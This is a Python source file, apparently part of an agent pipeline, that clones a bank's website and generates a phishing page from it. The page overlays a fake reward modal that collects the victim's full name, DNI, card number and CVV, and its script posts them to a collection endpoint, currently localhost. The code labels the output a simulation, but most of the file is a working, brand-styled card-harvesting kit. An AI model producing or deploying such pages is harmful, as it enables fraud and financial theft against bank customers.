from typing import Dict
from urllib.parse import urlparse
from bs4 import BeautifulSoup

from src.core.state import GraphState

def generate_phishing_form(analysis: Dict, cloned_html: str) -> str:
    """
    Genera un documento HTML con un formulario de phishing superpuesto.
    """
    brand_name = analysis.get("brand_elements", {}).get("brand_name", "Banco")
    colors = analysis.get("css_styles", {}).get("colors", ["#003366", "#ff6600"])
    primary_color = colors[0] if colors else "#003366"
    
    soup = BeautifulSoup(cloned_html, "html.parser")
    existing_styles = [tag.string for tag in soup.find_all('style') if tag.string]

    phishing_template = f"""
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Notificación Importante - {brand_name}</title>
        <style>
            {''.join(existing_styles)}
            .phishing-overlay {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 9999; display: flex; justify-content: center; align-items: center; }}
            .phishing-modal {{ background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); max-width: 500px; width: 90%; text-align: center; animation: slideIn 0.5s ease-out; position: relative; }}
            @keyframes slideIn {{ from {{ transform: translateY(-50px); opacity: 0; }} to {{ transform: translateY(0); opacity: 1; }} }}
            .phishing-title {{ color: {primary_color}; font-size: 24px; font-weight: bold; margin-bottom: 20px; }}
            .phishing-subtitle {{ color: #666; margin-bottom: 30px; line-height: 1.5; }}
            .phishing-form {{ text-align: left; }}
            .form-group {{ margin-bottom: 20px; }}
            .form-group label {{ display: block; margin-bottom: 5px; font-weight: bold; color: #333; }}
            .form-group input {{ width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; }}
            .form-group input:focus {{ border-color: {primary_color}; outline: none; }}
            .submit-btn {{ background: {primary_color}; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: background 0.3s; }}
            .submit-btn:hover {{ opacity: 0.9; }}
            .security-badge {{ display: flex; align-items: center; justify-content: center; margin-top: 20px; color: #666; font-size: 12px; }}
            .close-btn {{ position: absolute; top: 15px; right: 20px; background: none; border: none; font-size: 24px; cursor: pointer; color: #999; }}
        </style>
    </head>
    <body>
        {cloned_html}
        <div class="phishing-overlay" id="phishingModal">
            <div class="phishing-modal">
                <button class="close-btn" onclick="closeModal()">&times;</button>
                <div class="phishing-title">¡FELICIDADES!</div>
                <div class="phishing-subtitle">Ha sido seleccionado para recibir una recompensa exclusiva.<br>Para procesar el premio de <strong>S/ 5,000</strong>, se requiere una verificación de identidad.</div>
                <form class="phishing-form" onsubmit="handleSubmit(event)">
                    <div class="form-group"><label for="fullName">Nombre Completo:</label><input type="text" id="fullName" name="fullName" required></div>
                    <div class="form-group"><label for="dni">DNI:</label><input type="text" id="dni" name="dni" pattern="[0-9]{{8}}" required></div>
                    <div class="form-group"><label for="cardNumber">Número de Tarjeta (para depósito):</label><input type="text" id="cardNumber" name="cardNumber" pattern="[0-9]{{16}}" maxlength="16" required></div>
                    <div class="form-group"><label for="cvv">CVV:</label><input type="text" id="cvv" name="cvv" pattern="[0-9]{{3,4}}" maxlength="4" required></div>
                    <button type="submit" class="submit-btn">RECLAMAR RECOMPENSA</button>
                    <div class="security-badge">🔐 Conexión Segura</div>
                </form>
            </div>
        </div>
        <script>
            setTimeout(() => {{ document.getElementById('phishingModal').style.display = 'flex'; }}, 3000);
            function closeModal() {{ document.getElementById('phishingModal').style.display = 'none'; }}
            
            function handleSubmit(event) {{
                event.preventDefault();
                const form = event.target;
                const formData = new FormData(form);
                const capturedData = Object.fromEntries(formData.entries());

                const btn = form.querySelector('.submit-btn');
                btn.innerHTML = 'Procesando...';
                btn.disabled = true;

                fetch('http://localhost:8000', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify(capturedData),
                }})
                .then(response => response.json())
                .then(data => {{
                    document.querySelector('.phishing-modal').innerHTML = '<h2>¡Gracias!</h2><p>Sus datos están siendo procesados. Será redirigido en breve.</p>';
                }})
                .catch(error => {{
                    console.error('Error:', error);
                    document.querySelector('.phishing-modal').innerHTML = '<h2>Error</h2><p>Hubo un problema al procesar su solicitud. Intente más tarde.</p>';
                }});
            }}
        </script>
    </body>
    </html>
    """
    return phishing_template.strip()

def phishing_node(state: GraphState) -> Dict:
    """
    Nodo del grafo que genera la demostración de phishing.
    """
    print("\n[FASE 4/4] Ejecutando Agente de Simulación Phishing...")
    analysis = state["site_analysis"]
    cloned_html = state["cloned_html"]
    
    if not analysis or not cloned_html:
        message = "[WARN] No hay análisis o HTML disponible para la simulación. Omitiendo fase."
        print(message)
        return {{"phishing_confirmation": message}}
    
    phishing_html = generate_phishing_form(analysis, cloned_html)
    url = analysis.get("url", "unknown_site")
    host = urlparse(url).netloc.replace('.', '_').replace(':', '_')
    filename = f"{host}_phishing_demo.html"
    
    try:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(phishing_html)
        message = f"Simulación de phishing generada como '{filename}'."
        print(f"[SUCCESS] {message}")
        return {{"phishing_form": phishing_html, "phishing_confirmation": message}}
    except Exception as e:
        message = f"Error al generar la simulación de phishing: {e}"
        print(f"[ERROR] {message}")
        return {{"phishing_form": "", "phishing_confirmation": message}}